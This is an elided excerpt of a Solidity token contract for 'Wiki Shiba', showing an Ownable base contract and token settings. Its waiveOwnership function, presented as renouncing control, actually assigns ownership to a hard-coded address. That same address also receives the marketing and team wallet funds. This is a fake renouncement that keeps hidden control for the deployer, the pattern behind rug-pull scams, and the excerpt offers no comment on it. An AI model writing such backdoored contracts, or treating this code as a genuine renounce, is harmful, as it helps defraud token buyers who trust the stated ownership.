...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x69a1Ea8b4B1e9A653C2A7537fe4610a96c0233c4);
    }
...
contract WIKISHIBA is Context, IERC20, Ownable {
    ...
    string private _name = "Wiki Shiba";
    string private _symbol = "Wiki Shiba";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x69a1Ea8b4B1e9A653C2A7537fe4610a96c0233c4);
    address payable public teamWalletAddress = payable(0x69a1Ea8b4B1e9A653C2A7537fe4610a96c0233c4);
